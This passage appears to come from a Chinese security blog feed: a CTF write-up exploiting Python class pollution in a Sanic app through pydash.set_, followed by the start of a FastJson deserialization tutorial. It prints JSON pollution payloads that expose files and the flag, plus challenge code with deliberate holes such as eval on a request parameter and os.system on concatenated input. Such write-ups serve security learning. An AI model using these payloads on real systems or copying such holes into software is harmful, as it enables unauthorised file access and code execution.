path=admin&gt;&#125;</span><br><span class="line"></span><br><span class="line">app.router.routes_all</span><br><span class="line">输出:</span><br><span class="line">&#123;(&#x27;&#x27;,): &lt;Route: name=__mp_main__.index path=/&gt;, (&#x27;login&#x27;,): &lt;Route: name=__mp_main__.login path=login&gt;, (&#x27;src&#x27;,): &lt;Route: name=__mp_main__.src path=src&gt;, (&#x27;admin&#x27;,): &lt;Route: name=__mp_main__.admin path=admin&gt;, (&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;): &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;&#125;</span><br></pre></td></tr></table></figure><p>他们都是dict类型的, 因此我们可以这样得到路由实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[&#x27;__mp_main__.static&#x27;]</span><br><span class="line"></span><br><span class="line">app.router.routes_all[(&#x27;static&#x27;, &#x27;&lt;__file_uri__:path&gt;&#x27;)]</span><br></pre></td></tr></table></figure><p>接下来如何调用它的DirectoryHandler呢? </p><p>直接全局搜索name_index和routes_all</p><p>这个routes_all实际上是一个函数, 那么就没法用了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728001822973.png" alt="image-20240728001822973"></p><p>name_index有好几处调用, 我们在这里打上断点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003504702.png" alt="image-20240728003504702"></p><p>运行就能看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728003933038.png" alt="image-20240728003933038"></p><p>这样就确定了DirectoryHandler的位置 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.router.name_index[%27__mp_main__.static%27].handler.keywords[%27directory_handler%27]</span><br></pre></td></tr></table></figure><p>我们用gxn师傅的方法, 修改一下源码方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;nacl&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162040504.png" alt="image-20240728162040504"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728162049375.png" alt="image-20240728162049375"></p><p>污染directory_view</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>再次查看为true</p><p>接下来是污染Directory_handler对象的directory属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214109204.png" alt="image-20240728214109204"></p><p>需要注意的是这仍然是一个对象而不是一个字符串</p><p>可以看见directory下面有一个parts元组, 它的值与directory这个Path是对应的, 那么我们去看看这个parts做了什么</p><p>回到最开始的stastic函数中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728214444103.png" alt="image-20240728214444103"></p><p>打断点跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728215020285.png" alt="image-20240728215020285"></p><p>跟进<code>_from_parts</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728220152259.png" alt="image-20240728220152259"></p><p>发现parts是被赋值给了<code>_parts</code>属性, 并且这是一个list, 可以被污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221045713.png" alt="image-20240728221045713"></p><p>那么, 拿着这两个payload污染后访问&#x2F;static&#x2F;就可以看见flag了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728221559984.png" alt="image-20240728221559984"></p><p>之后再污染<code>__file__</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/src</code>得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240728222036306.png" alt="image-20240728222036306"></p><h2 id="Sanic’s-revenge"><a href="#Sanic’s-revenge" class="headerlink" title="Sanic’s revenge"></a>Sanic’s revenge</h2><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从Sanic到Sanic’s-revenge&quot;&gt;&lt;a href=&quot;#从Sanic到Sanic’s-revenge&quot; class=&quot;headerlink&quot; title=&quot;从Sanic到Sanic’s revenge&quot;&gt;&lt;/a&gt;从Sanic到Sanic’s reven</summary>
      
    
    
    
    
    <category term="Python原型链污染(类污染)" scheme="http://example.com/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>FastJson</title>
    <link href="http://example.com/2024/07/25/FastJson/"/>
    <id>http://example.com/2024/07/25/FastJson/</id>
    <published>2024-07-25T14:54:58.000Z</published>
    <updated>2024-07-26T08:20:28.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单来说Fastjson 是 Alibaba 开发的不同于Java原本的序列化与反序列化方法</p><p><code>JSON.toJSONString</code>序列化</p><p><code>JSON.parseObject/JSON.parse</code>反序列化</p><p>依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonSerializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">personJsonString</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(personJsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725232925683.png" alt="image-20240725232925683"></p><p>可以看见在toJSONString时getter被调用了</p><p>那么问题来了,这里的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">personJsonString</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><p>为什么多出来了一个SerializerFeature.WriteClassName参数</p><p>我们可以对比一下不加和加这个参数序列化后内容的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;age&quot;:19,&quot;name&quot;:&quot;n4c1&quot;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.example.Person&quot;,&quot;age&quot;:19,&quot;name&quot;:&quot;n4c1&quot;&#125;</span><br></pre></td></tr></table></figure><p>很明显加了参数后多了一个<code>&quot;@type&quot;:&quot;org.example.Person&quot;</code> </p><p>这是因为使用了<code>SerializerFeature.WriteClassName</code> 会在序列化的 JSON 中包含类的完全限定名(类名)，以便在反序列化时能够正确地还原对象。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonUnserializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">personJsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;age\&quot;:19,\&quot;name\&quot;:\&quot;n4c1\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(personJsonString, Person.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.println(person.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725234608614.png" alt="image-20240725234608614"></p><p>可以看见默认构造函数和setter被调用了</p><p>那么问题了, 这里的反序列化参数<code>Feature.SupportNonPublicField</code>又是什么?</p><blockquote><p>在 <code>fastjson</code> 库中，<code>Feature.SupportNonPublicField</code> 是一个反序列化特性，用于支持访问非公共（非 public）字段。默认情况下，<code>fastjson</code> 只会访问类的公共字段。如果类中的字段是私有的（<code>private</code>）或受保护的（<code>protected</code>），而没有提供相应的 getter 和 setter 方法，那么这些字段将不会被序列化或反序列化。</p><p>使用 <code>Feature.SupportNonPublicField</code> 参数可以告诉 <code>fastjson</code> 在反序列化时访问和设置这些非公共字段。</p></blockquote><p>举个例子</p><p>我们去掉Person类中的setter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;default constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void setName(String name) &#123;</span></span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setName&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> 